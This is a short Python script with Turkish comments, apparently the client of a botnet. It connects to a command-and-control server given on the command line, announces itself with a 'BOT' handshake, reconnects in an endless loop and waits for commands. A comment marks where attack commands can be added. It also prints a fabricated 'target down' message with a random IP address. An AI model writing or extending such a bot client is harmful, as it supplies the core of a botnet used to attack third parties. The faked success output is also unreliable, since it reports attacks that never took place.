import socket
import sys
import time
import random

# Komut satırından gelen Link ve Port bilgilerini al
if len(sys.argv) < 3:
    print("Kullanim: python3 bot.py [LINK] [PORT]")
    sys.exit()

link = sys.argv[1]
port = int(sys.argv[2])

def start_bot():
    while True:
        try:
            # Soket oluşturma
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10) # Bağlantı için 10 saniye sabret
            
            # Kışlaya (CNC) bağlanma
            s.connect((link, port))
            
            # --- EL SIKIŞMA (HANDSHAKE) ---
            # Panele "Ben buradayım" mesajı gönderiyoruz ki bizi listeye eklesin
            s.send("BOT".encode())
            
            print(f"[*] Hedef Düştü: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
            
            # CNC'den gelecek komutları bekle
            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    break # Bağlantı koptuysa döngüden çık
                
                # Burada saldırı komutu gelirse işlem yapabilirsin
                # Şimdilik sadece komutun ulaştığını simüle ediyoruz
                print(f"[*] Komut Alindi: {data}")
                
        except Exception as e:
            # Bağlantı koparsa veya kurulamazsa 5 saniye bekle ve tekrar dene
            time.sleep(5)
            continue

if __name__ == "__main__":
    start_bot()
